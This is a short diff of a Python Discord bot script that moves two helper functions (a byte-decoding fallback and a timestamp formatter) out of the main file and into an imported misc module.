@@ -1,8 +1,7 @@
-import json
 import discord
-import datetime
 import subprocess
 from discord.ext import commands
+from resources.modules.misc import *
 from urllib.request import urlopen
 
 client = commands.Bot(command_prefix=['.'], intents=discord.Intents.all(), case_insensitive=True)
@@ -67,15 +66,6 @@ async def on_ready():
                 channel_ids['main'] = channel.id
             elif channel.name == 'file-related':
                 channel_ids['file'] = channel.id
-
-def force_decode(b: bytes):
-    try:
-        return b.decode(json.detect_encoding(b))
-    except UnicodeDecodeError:
-        return b.decode(errors="backslashreplace")
-    
-def current_time(with_seconds=False):
-    return datetime.datetime.now().strftime('%d.%m.%Y_%H.%M' if not with_seconds else '%d.%m.%Y_%H.%M.%S')
 
 @client.command(name="ping")
 async def bot_status(ctx):
